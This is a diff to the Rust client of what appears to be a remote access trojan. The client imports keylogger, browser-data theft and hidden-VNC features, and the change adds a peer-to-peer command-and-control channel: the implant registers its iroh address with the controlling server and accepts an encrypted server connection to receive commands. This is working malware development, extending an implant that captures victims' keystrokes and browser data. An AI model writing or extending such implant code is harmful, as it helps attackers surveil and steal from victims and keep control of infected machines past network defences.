@@ -27,6 +27,9 @@ use crate::features::keylogger::{start_keylogger, stop_keylogger, send_offline_l
 use crate::features::browser::get_browser_data;
 //use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
+use common::packets::Packet;
+use std::sync::Arc;
+use iroh;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
 use tokio::sync::mpsc;
@@ -67,6 +70,33 @@ pub async fn reading_loop(
                             Err(e) => println!("Failed to send client info on retry: {}", e),
                         }
                     }
+                }
+
+                // Initialize Iroh and send P2P Handshake Request
+                let iroh_manager = {
+                    let mut lock = crate::IROH_MANAGER.lock().unwrap();
+                    if lock.is_none() {
+                        let secret_key = iroh::SecretKey::generate();
+                        match common::p2p::IrohManager::new(secret_key).await {
+                            Ok(manager) => {
+                                let manager = Arc::new(manager);
+                                *lock = Some(manager.clone());
+                                Some(manager)
+                            }
+                            Err(e) => {
+                                println!("Failed to initialize Iroh: {}", e);
+                                None
+                            }
+                        }
+                    } else {
+                        lock.clone()
+                    }
+                };
+
+                if let Some(manager) = iroh_manager {
+                    let addr = manager.addr();
+                    let addr_json = serde_json::to_string(&addr).unwrap();
+                    let _ = send_packet(ServerboundPacket::P2PHandshakeRequest(addr_json)).await;
                 }
             }
 
@@ -261,6 +291,31 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopNotificationCapture)) => {
                 stop_notification_capture();
+            }
+
+            Ok(Some(ClientboundPacket::P2PHandshakeResponse(server_iroh_addr_json, session_key))) => {
+                let iroh_manager = crate::IROH_MANAGER.lock().unwrap().clone();
+                if let Some(manager) = iroh_manager {
+                    let _server_iroh_addr: iroh::EndpointAddr = serde_json::from_str(&server_iroh_addr_json).unwrap();
+                    let iroh_endpoint = manager.endpoint().clone();
+                    let crypto = common::p2p::P2PChannel::new(session_key);
+
+                    tokio::spawn(async move {
+                        // Wait for incoming connection from server
+                        while let Some(incoming) = iroh_endpoint.accept().await {
+                            match incoming.await {
+                                Ok(conn) => {
+                                    println!("Accepted P2P connection from server");
+                                    let (dispatcher, _, _) = common::p2p::P2PDispatcher::new(conn, crypto.clone());
+                                    let mut lock = crate::P2P_DISPATCHER.lock().unwrap();
+                                    *lock = Some(dispatcher);
+                                    break;
+                                }
+                                Err(e) => println!("Error accepting P2P connection: {}", e),
+                            }
+                        }
+                    });
+                }
             }
 
             Ok(Some(p)) => {
